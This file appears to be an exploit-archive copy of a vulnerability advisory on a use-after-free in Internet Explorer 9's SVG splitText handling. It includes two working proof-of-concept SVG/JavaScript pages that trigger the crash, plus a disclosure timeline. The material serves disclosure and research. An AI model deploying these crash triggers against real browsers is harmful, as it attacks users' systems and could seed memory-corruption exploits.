@@ -1,0 +1,84 @@
+<!--
+Source: http://blog.skylined.nl/20161215001.html
+
+Synopsis
+
+A specially crafted web-page can trigger a use-after-free vulnerability in Microsoft Internet Explorer 9. The use appears to happen only once almost immediately after the free, which makes practical exploitation unlikely.
+
+Known affected software and attack vectors
+
+Microsoft Internet Explorer 9
+
+An attacker would need to get a target user to open a specially crafted web-page. Disabling Java­Script should prevent an attacker from triggering the vulnerable code path.
+
+Details
+
+It appears there is an implementation bug in the split­Text method of CDATASection (Text) objects in SVG. split­Text should split a Text node into two Text nodes, by creating a new Text node and moving some of the text data from the original node to the new node. After this, each node contains a sub-string of the original text.
+
+The bug can be triggered by calling this method with zero as the index argument on a CDATASection which contains some text. In this case, the code will return a new Text node that contains the entire text but it does not remove the text from the original node. I am speculating that this causes an additional reference to the test data without increasing its reference counter. This failure to increase the reference counter can cause this reference counter to drop to zero before all references are destroyed. I believe this is the case because the below repro triggers a use-after-free.
+
+<svg xmlns='http://www.w3.org/2000/svg'>
+  <script type="text/javascript">
+    var o­CDATASection = document.create­CDATASection("Aa");
+    o­Text­Node1 = o­CDATASection.split­Text(0);
+    alert("Expected ''+'Aa', got '" + o­CDATASection.whole­Text + "'+'" + o­Text­Node1.whole­Text + "'");
+    o­CDATASection.append­Data("Bb");
+    alert("Expected 'Bb'+'Aa', got '" + o­CDATASection.whole­Text + "'+'" + o­Text­Node1.whole­Text + "'");
+    o­Text­Node3 = o­CDATASection.split­Text(0);
+// Uncommenting the following line prevents the crash - not sure why.
+//    alert("Expected ''+'Bb'+'Aa', got '" + o­CDATASection.whole­Text + "'+'" + o­Text­Node3.whole­Text + "'+'" + o­Text­Node1.whole­Text + "'");
+    o­Text­Node3.replace­Whole­Text("Cc");
+  </script>
+</svg>
+
+I've created another, more complex repro as well:
+
+Repro.svg:
+-->
+
+<svg xmlns='http://www.w3.org/2000/svg'>
+  <script type="text/javascript">
+    function B(b­Value) { return b­Value ? "T" : "F" };
+    var o­Element = document.create­Element("x");
+    var o­CDATASection = document.create­CDATASection("AB");
+    o­Element.append­Child(o­CDATASection);
+    // split­Text should split a Text node into two text Nodes, each containing a substring of the data of the original Text node.
+    // However, MSIE does not implement this correctly, causing both Text nodes to refer to the same data.
+    o­Text­Node1 = o­CDATASection.split­Text(0);
+    alert("[AB**|AB**AB=AB]\r\n[" +
+        o­Element.text­Content + "**" + 
+        o­CDATASection.node­Value + "|" + o­Text­Node1.node­Value + "**" +
+        o­CDATASection.whole­Text + "=" + o­Text­Node1.whole­Text + "]");
+    o­CDATASection.append­Data("CD");
+    alert("[CDAB**CD|AB**CDAB=CDAB]TT\r\n[" +
+        o­Element.text­Content + "**" + 
+        o­CDATASection.node­Value + "|" + o­Text­Node1.node­Value + "**" +
+        o­CDATASection.whole­Text + "=" + o­Text­Node1.whole­Text + "]" +
+        B(o­CDATASection.parent­Node === o­Element) + B(o­Text­Node1.parent­Node === o­Element)
+    );
+    var o­Text­Node2 = o­CDATASection.split­Text(0);
+    alert("[CDAB**|CD|AB**CDAB=CDAB=CDAB]TTT\r\n[" +
+        o­Element.text­Content + "**" + 
+        o­CDATASection.node­Value + "|" + o­Text­Node2.node­Value + "|" + o­Text­Node1.node­Value + "**" +
+        o­CDATASection.whole­Text + "=" + o­Text­Node2.whole­Text + "=" + o­Text­Node1.whole­Text + "]" +
+        B(o­CDATASection.parent­Node === o­Element) + B(o­Text­Node2.parent­Node === o­Element) + B(o­Text­Node1.parent­Node === o­Element)
+    );
+    var o­Text­Node3 = o­CDATASection.replace­Whole­Text("EF");
+    alert("[EF**EF||**EF=EF=EF]TFF\r\n[" +
+        o­Element.text­Content + "**" + 
+        o­CDATASection.node­Value + "|" + o­Text­Node2.node­Value + "|" + o­Text­Node1.node­Value + "**" +
+        o­CDATASection.whole­Text + "=" + o­Text­Node2.whole­Text + "=" + o­Text­Node1.whole­Text + "]" +
+        o­CDATASection.parent­Node + "/" + o­Text­Node2.parent­Node + "/" + o­Text­Node1.parent­Node
+    );
+  </script>
+</svg>
+
+<!--
+Time-line
+
+Unknown date: This vulnerability was found through fuzzing.
+12 December 2012: This vulnerability was submitted to EIP.
+21 January 2013: This vulnerability was rejected by EIP.
+Unknown date: This vulnerability was address by Microsoft.
+15 December 2016: Details of this vulnerability are released.
+-->
